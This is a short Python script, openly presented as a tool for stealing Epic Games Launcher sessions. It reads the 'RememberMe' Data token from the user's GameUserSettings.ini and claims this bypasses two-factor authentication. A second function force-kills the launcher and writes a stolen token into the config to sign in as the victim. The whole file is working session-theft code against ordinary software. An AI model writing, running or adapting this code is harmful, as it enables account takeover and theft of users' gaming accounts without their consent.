import os

"""
Exfiltrating epic games sessions via the insecure RememberMe data.
This bypasses 2FA and any other kind of authentication.
"""

def steal_eg():
    # Path to where epic games insecure data is located
    eg_path = os.getenv('LOCALAPPDATA') + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"


    with open(eg_path, 'r') as f:
        lines = f.readlines()

    for line in lines:
        if line.startswith('Data='):
            eg_data = line.split('Data=')[1].strip() # Found remember me data
    return eg_data

def signin_with_stolen_data(data:str):
    os.system('taskkill /f /IM EpicGamesLauncher.exe >nul 2>&1') # Closing Epic Games Launcher processes.
    eg_path = os.getenv('LOCALAPPDATA') + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"

    with open(eg_path, 'r') as f:
        lines = f.readlines()

    for i in range(len(lines)):
        if lines[i].startswith('Data='):
            # Replacing data
            lines[i] = 'Data=' + data
    with open(eg_path, 'w') as f:
        f.writelines(''.join(lines))

# print(steal_eg())
# signin_with_stolen_data("data")
